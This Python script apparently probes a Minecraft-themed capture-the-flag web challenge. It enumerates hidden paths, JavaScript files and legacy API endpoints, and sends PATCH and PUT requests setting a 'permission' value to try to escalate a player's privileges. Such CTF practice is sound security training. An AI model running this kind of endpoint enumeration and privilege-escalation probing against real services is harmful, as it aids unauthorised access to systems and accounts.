#!/usr/bin/env python3
import requests

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

def req(method, path, **kw):
    try:
        r = getattr(s, method)(BASE + path, timeout=15, allow_redirects=False, **kw)
        return r.status_code, r.text[:800], r.headers
    except Exception as e:
        return 0, str(e), {}

# Explore more paths
# Challenge says: "legacy server telemetry" - maybe /api/v1 has IDOR or info
# "elevate your survival privileges" - maybe PATCH/PUT profile

print('=== Check /nether full response ===')
code, body, hdrs = req('get', '/nether')
print(body)

print()
print('=== Try more dimensions ===')
for dim in ['/end', '/the-end', '/overworld', '/void', '/rift', '/dimension/nether', '/dimension/end']:
    code, body, _ = req('get', dim)
    if code not in [404, 0]:
        print(f'[{code}] {dim}: {body[:400]}')

print()
print('=== Check JS files for more endpoints ===')
for js in ['/js/operator.js', '/js/dimensions.js', '/js/player.js', '/js/telemetry.js', '/js/legacy.js']:
    code, body, _ = req('get', js)
    if code not in [404, 0]:
        print(f'[{code}] {js}: {body[:500]}')

print()
print('=== Check CSS/HTML for clues ===')
for f in ['/css/style.css', '/css/dimensions.css', '/css/animations.css']:
    code, body, _ = req('get', f)
    if code == 200:
        print(f'[{code}] {f}: {body[:200]}')

print()
print('=== Try PATCH/PUT on profile ===')
for method in ['patch', 'put']:
    for path in ['/api/v2/player/profile', '/api/v2/player']:
        code, body, _ = req(method, path, json={'permission': 3}, headers={'Accept': 'application/json'})
        if code not in [404, 405, 0]:
            print(f'  {method.upper()} [{code}] {path}: {body[:300]}')

print()
print('=== Try /api/v2/player/profile with different verbs ===')
for method in ['get', 'post', 'put', 'patch', 'delete']:
    code, body, _ = req(method, '/api/v2/player/profile', headers={'Accept': 'application/json'})
    print(f'  {method.upper()} [{code}]: {body[:200]}')

print()
print('=== Try /api/v1/telemetry ===')
# The challenge says "legacy server telemetry" - maybe it's accessible
for path in [
    '/api/v1/telemetry', '/api/v1/', '/api/v1/server',
    '/api/v1/player/profile', '/api/v1/player/Steve',
    '/api/v1/server/info', '/api/v1/world',
    '/telemetry', '/telemetry/Steve', '/telemetry/server',
    '/legacy/telemetry', '/legacy/player',
]:
    code, body, _ = req('get', path, headers={'Accept': 'application/json'})
    if code not in [404, 0]:
        print(f'  GET [{code}] {path}: {body[:300]}')
